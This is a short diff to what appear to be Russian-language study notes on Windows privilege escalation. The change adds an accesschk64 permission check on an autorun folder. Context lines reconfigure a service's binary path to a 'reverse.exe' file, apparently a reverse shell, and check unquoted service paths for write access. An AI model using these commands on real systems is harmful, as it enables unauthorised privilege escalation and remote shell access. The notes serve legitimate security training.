@@ -189,7 +189,9 @@ sc query daclsvc - информация о состянии службы (ста
 
 sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\"" - смена пути к файлу сервиса
 
-# Узнать кто может писать в директорию
+# Узнать у кого доступ в директорию
+
+accesschk64.exe -wvu -accepteula "C:\Program Files\Autorun Program"
 
 C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
 
